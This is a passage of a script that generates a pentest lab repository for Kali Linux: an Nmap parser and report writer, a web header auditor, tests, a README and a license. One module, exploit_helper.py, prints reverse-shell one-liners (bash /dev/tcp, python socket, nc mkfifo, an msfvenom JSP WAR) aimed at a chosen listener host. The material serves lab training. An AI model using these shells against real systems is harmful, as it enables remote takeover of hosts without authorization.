        f"<tr><td>{s.port}/{html.escape(s.protocol)}</td><td>{html.escape(s.service)}</td><td>{html.escape(s.banner_summary)}</td></tr>"
        for s in services
    )
    vuln_rows = "".join(
        f"<tr><td><strong>{html.escape(v.severity)}</strong></td><td>{v.cvss:.1f}</td><td>{v.port}/{html.escape(v.protocol)}</td>"
        f"<td>{html.escape(v.title)}</td><td>{html.escape(v.cve)}</td><td>{html.escape(v.remediation)}</td></tr>"
        for v in vulns
    )
    return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>${safeTool} VAPT Report — {html.escape(target_ip)}</title>
<style>
  body {{ font-family: system-ui, -apple-system, sans-serif; color: #0f172a; max-width: 960px; margin: 32px auto; padding: 0 20px; line-height: 1.5; }}
  h1, h2 {{ border-bottom: 1px solid #cbd5e1; padding-bottom: 6px; }}
  table {{ width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }}
  th, td {{ border: 1px solid #cbd5e1; padding: 8px 10px; text-align: left; vertical-align: top; }}
  th {{ background: #f1f5f9; }}
  .meta {{ color: #475569; font-size: 13px; margin-bottom: 24px; }}
</style>
</head>
<body>
  <h1>${safeTool} — Automated VAPT Report</h1>
  <div class="meta">
    <strong>Program:</strong> ${safeProgram} &middot;
    <strong>Assessor:</strong> {html.escape(author)} &middot;
    <strong>Target:</strong> {html.escape(target_ip)} &middot;
    <strong>OS:</strong> {html.escape(os_guess)} &middot;
    <strong>Generated:</strong> {html.escape(generated_at)}
  </div>
  <h2>1. Discovered Open Services ({len(services)})</h2>
  <table><thead><tr><th>Port</th><th>Service</th><th>Banner / Version</th></tr></thead><tbody>{svc_rows}</tbody></table>
  <h2>2. Correlated Vulnerabilities ({len(vulns)})</h2>
  <table><thead><tr><th>Severity</th><th>CVSS</th><th>Port</th><th>Finding</th><th>Reference</th><th>Remediation</th></tr></thead><tbody>{vuln_rows}</tbody></table>
</body>
</html>
"""


def write_artifacts(
    out_dir: Path,
    target_ip: str,
    os_guess: str,
    services: List[OpenService],
    vulns: List[MatchedVulnerability],
    author: str,
    lhost: str = "${kaliIp}",
) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    now_iso = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    json_payload = {
        "tool": "${safeTool}",
        "program": "${safeProgram}",
        "target_ip": target_ip,
        "os_guess": os_guess,
        "generated_at": now_iso,
        "author": author,
        "open_services": [asdict(s) for s in services],
        "matched_vulnerabilities": [asdict(v) for v in vulns],
    }
    (out_dir / "findings.json").write_text(json.dumps(json_payload, indent=2), encoding="utf-8")

    md_lines = [
        f"# ${safeTool} VAPT Analysis Report — {target_ip}",
        "",
        f"- **Program**: ${safeProgram}",
        f"- **Assessor**: {author}",
        f"- **Target IP**: \`{target_ip}\`",
        f"- **OS Fingerprint**: {os_guess}",
        f"- **Generated**: {now_iso}",
        "",
        "## 1. Open Services Discovered",
        "",
        "| Port | Protocol | Service | Banner / Version |",
        "| ---: | --- | --- | --- |",
    ]
    for s in services:
        md_lines.append(f"| {s.port} | {s.protocol} | {s.service} | {s.banner_summary} |")

    md_lines.extend(
        [
            "",
            "## 2. Correlated Vulnerabilities (CVSS v3.1)",
            "",
            "| Severity | CVSS | Port | Finding | Reference |",
            "| --- | ---: | ---: | --- | --- |",
        ]
    )
    for v in vulns:
        md_lines.append(f"| {v.severity} | {v.cvss:.1f} | {v.port}/{v.protocol} | {v.title} | {v.cve} |")

    md_lines.extend(["", "## 3. Remediation Recommendations", ""])
    for idx, v in enumerate(vulns, start=1):
        md_lines.append(f"{idx}. **{v.title} (Port {v.port})**: {v.remediation}")

    (out_dir / "vapt_report.md").write_text("\\n".join(md_lines) + "\\n", encoding="utf-8")
    (out_dir / "vapt_report.html").write_text(
        build_html_report(target_ip, os_guess, services, vulns, author, now_iso),
        encoding="utf-8",
    )

    rc_lines = [
        f"# Authorized Lab Verification Resource Script for {target_ip}",
        "# Run inside Kali Linux: msfconsole -q -r msf_lab_verify.rc",
        "",
    ]
    for v in vulns:
        if v.msf_module:
            rc_lines.append(f"# --- {v.title} ({v.cve}) ---")
            rc_lines.append(f"use {v.msf_module}")
            rc_lines.append(f"set RHOSTS {target_ip}")
            rc_lines.append(f"set LHOST {lhost}")
            rc_lines.append("check")
            rc_lines.append("")
    (out_dir / "msf_lab_verify.rc").write_text("\\n".join(rc_lines), encoding="utf-8")


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="${safeTool} Nmap XML Parser & Vulnerability Mapper")
    parser.add_argument("--xml", required=True, help="Path to Nmap XML output file")
    parser.add_argument("--out", default="output", help="Directory for output artifacts")
    parser.add_argument("--author", default="${safeAuthor}", help="Assessor name for report metadata")
    parser.add_argument("--lhost", default="${kaliIp}", help="Kali LHOST for Metasploit .rc generation")
    args = parser.parse_args(argv)

    try:
        target_ip, os_guess, services = parse_nmap_xml(Path(args.xml))
    except (FileNotFoundError, ValueError) as exc:
        print(f"[ERROR] {exc}", file=sys.stderr)
        return 1

    vulns = match_vulnerabilities(services)
    write_artifacts(Path(args.out), target_ip, os_guess, services, vulns, args.author, args.lhost)
    print(f"[OK] Parsed {len(services)} open services and matched {len(vulns)} vulnerabilities for {target_ip}.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
`;

  const webAuditPy = `#!/usr/bin/env python3
"""
${safeTool} — Web Surface & Security Header Auditor
---------------------------------------------------
Pure Python 3 HTTP/HTTPS endpoint prober (zero external dependencies).
Checks sensitive directories, HTTP server disclosures, and security headers.
Author: ${safeAuthor} | License: MIT
"""

from __future__ import annotations

import argparse
import http.client
import json
import sys
from pathlib import Path
from typing import Dict, List

DEFAULT_PATHS = [
    "/",
    "/robots.txt",
    "/dvwa/",
    "/mutillidae/",
    "/phpMyAdmin/",
    "/manager/html",
    "/.git/HEAD",
    "/server-status",
]

SECURITY_HEADERS = [
    "x-frame-options",
    "x-content-type-options",
    "content-security-policy",
    "strict-transport-security",
]


def evaluate_headers(headers: Dict[str, str]) -> Dict[str, object]:
    lowered = {k.lower(): v for k, v in headers.items()}
    missing = [h for h in SECURITY_HEADERS if h not in lowered]
    return {
        "server_banner": lowered.get("server", "Not disclosed"),
        "powered_by": lowered.get("x-powered-by", "Not disclosed"),
        "missing_security_headers": missing,
    }


def probe_http_target(host: str, port: int, timeout: float = 2.0) -> Dict[str, object]:
    findings: List[Dict[str, object]] = []
    root_headers: Dict[str, str] = {}

    for path in DEFAULT_PATHS:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            conn.request("GET", path, headers={"User-Agent": "${safeTool}-WebAudit/2.0"})
            resp = conn.getresponse()
            if path == "/":
                root_headers = dict(resp.getheaders())
            if resp.status in (200, 301, 302, 401, 403):
                findings.append({"path": path, "status": resp.status, "reason": resp.reason})
        except OSError:
            continue
        finally:
            conn.close()

    return {
        "target": f"http://{host}:{port}",
        "header_audit": evaluate_headers(root_headers),
        "discovered_paths": findings,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="${safeTool} Web Surface & Security Header Auditor")
    parser.add_argument("-t", "--target", required=True, help="Target IPv4 or hostname")
    parser.add_argument("-p", "--ports", default="80,8180", help="Comma-separated HTTP ports")
    parser.add_argument("--out", default="output/web_audit.json", help="JSON output file path")
    args = parser.parse_args()

    ports = [int(p.strip()) for p in args.ports.split(",") if p.strip().isdigit()]
    results = [probe_http_target(args.target, port) for port in ports]

    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(results, indent=2), encoding="utf-8")
    print(f"[OK] Web audit saved to {out_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
`;

  const exploitHelperPy = `#!/usr/bin/env python3
"""
${safeTool} — Authorized Lab Reverse-Shell & Payload Reference Generator
-----------------------------------------------------------------------
Generates parameterized verification commands for Kali Linux labs using
your configured LHOST and LPORT. Strictly for isolated lab assessments.
Author: ${safeAuthor} | License: MIT
"""

from __future__ import annotations

import argparse
import sys
from typing import Dict


def generate_oneliners(lhost: str, lport: int) -> Dict[str, str]:
    return {
        "listener": f"nc -lvnp {lport}",
        "bash_tcp": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
            f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "netcat_mkfifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "msfvenom_war": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > lab_shell.war",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="${safeTool} Lab Payload Reference Generator")
    parser.add_argument("--lhost", default="${kaliIp}", help="Kali Linux listener IP (default: ${kaliIp})")
    parser.add_argument("--lport", type=int, default=4444, help="Listener port (default: 4444)")
    args = parser.parse_args()

    print(f"# ${safeTool} Authorized Lab Payloads | LHOST={args.lhost} LPORT={args.lport}")
    for name, cmd in generate_oneliners(args.lhost, args.lport).items():
        print(f"\\n[{name}]\\n{cmd}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
`;

  const testSuitePy = `#!/usr/bin/env python3
"""
Unit test suite for ${safeTool} (${safeRepo}).
Run with: python3 -m unittest discover -s tests -v
"""

import tempfile
import unittest
from pathlib import Path

from src.exploit_helper import generate_oneliners
from src.netrecon_v2 import audit_http_headers, expand_targets, parse_port_spec
from src.vapt_engine import match_vulnerabilities, parse_nmap_xml, write_artifacts
from src.web_audit import evaluate_headers

SAMPLE_NMAP_XML = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <address addr="${targetIp}" addrtype="ipv4"/>
    <os>
      <osmatch name="Linux 2.6.9 - 2.6.33" accuracy="100"/>
    </os>
    <ports>
      <port protocol="tcp" portid="21">
        <state state="open"/>
        <service name="ftp" product="vsftpd" version="2.3.4"/>
      </port>
      <port protocol="tcp" portid="445">
        <state state="open"/>
        <service name="netbios-ssn" product="Samba smbd" version="3.0.20-Debian"/>
      </port>
      <port protocol="tcp" portid="1524">
        <state state="open"/>
        <service name="ingreslock" product="Metasploitable root shell"/>
        <script id="banner" output="root@metasploitable:/#"/>
      </port>
      <port protocol="tcp" portid="22">
        <state state="closed"/>
        <service name="ssh"/>
      </port>
    </ports>
  </host>
</nmaprun>
"""


class TestNetReconV2(unittest.TestCase):
    def test_parse_port_spec_valid(self):
        self.assertEqual(parse_port_spec("22,80,20-21"), [20, 21, 22, 80])

    def test_parse_port_spec_invalid_raises(self):
        with self.assertRaises(ValueError):
            parse_port_spec("99999")
        with self.assertRaises(ValueError):
            parse_port_spec("100-50")

    def test_expand_targets_cidr(self):
        hosts = expand_targets("192.168.56.0/30")
        self.assertEqual(hosts, ["192.168.56.1", "192.168.56.2"])

    def test_audit_http_headers(self):
        missing = audit_http_headers("HTTP/1.1 200 OK\\r\\nServer: Apache/2.2.8\\r\\n")
        self.assertIn("x-frame-options", missing)
        self.assertIn("content-security-policy", missing)


class TestVaptEngine(unittest.TestCase):
    def test_parse_match_and_export_all_formats(self):
        with tempfile.TemporaryDirectory() as tmp:
            xml_file = Path(tmp) / "sample.xml"
            xml_file.write_text(SAMPLE_NMAP_XML, encoding="utf-8")

            ip, os_guess, services = parse_nmap_xml(xml_file)
            self.assertEqual(ip, "${targetIp}")
            self.assertIn("Linux", os_guess)
            self.assertEqual([s.port for s in services], [21, 445, 1524])

            vulns = match_vulnerabilities(services)
            cves = {v.cve for v in vulns}
            self.assertIn("CVE-2011-2523", cves)
            self.assertIn("CVE-2007-2447", cves)
            self.assertIn("CWE-284", cves)

            out_dir = Path(tmp) / "out"
            write_artifacts(out_dir, ip, os_guess, services, vulns, "${safeAuthor}", "${kaliIp}")
            self.assertTrue((out_dir / "findings.json").exists())
            self.assertTrue((out_dir / "vapt_report.md").exists())
            self.assertTrue((out_dir / "vapt_report.html").exists())
            self.assertTrue((out_dir / "msf_lab_verify.rc").exists())

    def test_missing_xml_raises(self):
        with self.assertRaises(FileNotFoundError):
            parse_nmap_xml(Path("/nonexistent/missing.xml"))


class TestModules(unittest.TestCase):
    def test_web_header_eval(self):
        res = evaluate_headers({"Server": "Apache/2.2.8", "X-Frame-Options": "SAMEORIGIN"})
        self.assertEqual(res["server_banner"], "Apache/2.2.8")
        self.assertNotIn("x-frame-options", res["missing_security_headers"])
        self.assertIn("content-security-policy", res["missing_security_headers"])

    def test_exploit_helper_oneliners(self):
        cmds = generate_oneliners("${kaliIp}", 4444)
        self.assertIn("${kaliIp}/4444", cmds["bash_tcp"])
        self.assertIn("LHOST=${kaliIp}", cmds["msfvenom_war"])


if __name__ == "__main__":
    unittest.main()
`;

  const readmeMd = `# ${safeTool} (\`${safeRepo}\`)

> **${safeProgram}** — Automated Reconnaissance, Web Auditing & VAPT Reporting Suite  
> Built by **${safeAuthor}** (\`@${safeUser}\`) · Lab Environment: **${safeLab}**

A modular, standard-library Python 3 and Bash penetration-testing automation suite engineered for Kali Linux labs. Covers **both Phase 2 Scripting & Automation tracks**:

1. **Option 1 — Upgraded Phase 1 Recon Tool (\`src/netrecon_v2.py\` + \`run_recon_upgrade.sh\`)**  
   Concurrent TCP + top-port UDP scanning, CIDR subnet sweeps, protocol-aware banner grabbing, TLS/SSL certificate expiry checks, HTTP security header audits, interactive CLI mode, and JSON/Markdown/CSV export.
2. **Option 2 — Full Hybrid VAPT Pipeline (\`auto_vapt.sh\` + \`src/vapt_engine.py\` + \`src/web_audit.py\` + \`src/exploit_helper.py\`)**  
   Profiled Nmap execution (\`quick\`, \`standard\`, \`deep\`), SearchSploit XML correlation, conditional Nikto/Enum4linux enumeration, Python web-path discovery, CVSS v3.1 vulnerability correlation, standalone HTML + Markdown + JSON reporting, and Metasploit \`.rc\` generation.

---

## Repository Layout

\`\`\`text
${safeRepo}/
├── auto_vapt.sh             # Option 2: Profiled Bash VAPT orchestrator
├── run_recon_upgrade.sh     # Option 1: Wrapper for NetRecon v2
├── src/
│   ├── __init__.py
│   ├── netrecon_v2.py       # Option 1: Multi-threaded TCP/UDP + CIDR + TLS/HTTP recon
│   ├── vapt_engine.py       # Option 2: Nmap XML/NSE parser & HTML/MD/JSON/RC engine
│   ├── web_audit.py         # Pure Python 3 HTTP directory & security header auditor
│   └── exploit_helper.py    # Parameterized lab reverse-shell & msfvenom helper
├── tests/
│   ├── __init__.py
│   └── test_vapt_suite.py   # Comprehensive unittest suite
├── requirements.txt
├── LICENSE                  # MIT License
└── README.md
\`\`\`

---

## Usage in Kali Linux

\`\`\`bash
chmod +x auto_vapt.sh run_recon_upgrade.sh

# Option 1: Multi-threaded TCP/UDP + CIDR / Single Target Recon
python3 src/netrecon_v2.py -t ${targetIp} --udp --tls
python3 src/netrecon_v2.py --interactive

# Option 2: End-to-End Profiled VAPT Pipeline
sudo ./auto_vapt.sh -t ${targetIp} -l ${kaliIp} -i ${iface} --profile standard
sudo ./auto_vapt.sh -t ${targetIp} -l ${kaliIp} -i ${iface} --profile deep

# Standalone Web & Payload Helpers
python3 src/web_audit.py -t ${targetIp} -p 80,8180
python3 src/exploit_helper.py --lhost ${kaliIp} --lport 4444
\`\`\`

## Running Unit Tests

\`\`\`bash
python3 -m unittest discover -s tests -v
\`\`\`

## Ethical Notice

Developed strictly for authorized local lab environments (${safeLab}). Never target systems without explicit authorization.

## License

Licensed under the [MIT License](LICENSE).
`;

  const mitLicense = `MIT License

Copyright (c) ${year} ${safeAuthor}

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
`;

  const requirementsTxt = `# Uses Python 3 standard library only (zero external runtime dependencies).
# Optional test runner:
# pytest>=8.0.0
`;

  const gitignore = `# Python cache
__pycache__/
*.py[cod]
*$py.class
.venv/
venv/

# Scan outputs & lab artifacts
output/
*.xml
*.gnmap
*.nmap
*.war
.DS_Store
`;

  return [
    {
      path: 'auto_vapt.sh',
      language: 'bash',
      optionGroup: 'option2',
      description: 'Option 2 profiled Bash pipeline (--profile quick|standard|deep, SearchSploit, Nikto, Enum4linux, Python engine).',
      content: autoVaptSh,
    },
    {
      path: 'src/vapt_engine.py',
      language: 'python',
      optionGroup: 'option2',
      description: 'Option 2 Python XML/NSE parser & 15-signature CVSS v3.1 engine exporting JSON, Markdown, HTML, and MSF .rc.',
      content: vaptEnginePy,
    },
    {
      path: 'src/netrecon_v2.py',
      language: 'python',
      optionGroup: 'option1',
      description: 'Option 1 upgraded scanner: CIDR sweeps, multi-threaded TCP + UDP, TLS expiry, HTTP headers, interactive CLI, CSV/MD/JSON.',
      content: netreconV2Py,
    },
    {
      path: 'run_recon_upgrade.sh',
      language: 'bash',
      optionGroup: 'option1',
      description: 'Option 1 Bash wrapper executing NetRecon v2 with TCP, UDP, and TLS checks.',
      content: runUpgradeSh,
    },
    {
      path: 'src/web_audit.py',
      language: 'python',
      optionGroup: 'modules',
      description: 'Pure Python 3 HTTP directory & security header auditor (/dvwa/, /manager/html, /.git/HEAD, server banners).',
      content: webAuditPy,
    },
    {
      path: 'src/exploit_helper.py',
      language: 'python',
      optionGroup: 'modules',
      description: 'Authorized lab reverse-shell & msfvenom command generator parameterized with your Kali LHOST/LPORT.',
      content: exploitHelperPy,
    },
    {
      path: 'tests/test_vapt_suite.py',
      language: 'python',
      optionGroup: 'shared',
      description: '8-test unit suite verifying CIDR expansion, port parsing, header scoring, XML/NSE parsing, and multi-format exports.',
      content: testSuitePy,
    },
    {
      path: 'README.md',
      language: 'markdown',
      optionGroup: 'shared',
      description: 'Portfolio-ready GitHub README dynamically customized with your tool name, program, lab, and repository.',
      content: readmeMd,
    },
    {
      path: 'LICENSE',
      language: 'text',
      optionGroup: 'shared',
      description: 'Open-source MIT License attributed to your name and assessment year.',
      content: mitLicense,
    },
    {
      path: 'requirements.txt',
      language: 'text',
      optionGroup: 'shared',
      description: 'Zero-dependency standard-library Python 3 manifest.',
      content: requirementsTxt,
    },
    {
      path: '.gitignore',
      language: 'text',
      optionGroup: 'shared',
      description: 'Excludes raw scan XMLs, output folders, .war payloads, and Python cache files.',
      content: gitignore,
    },
  ];
}
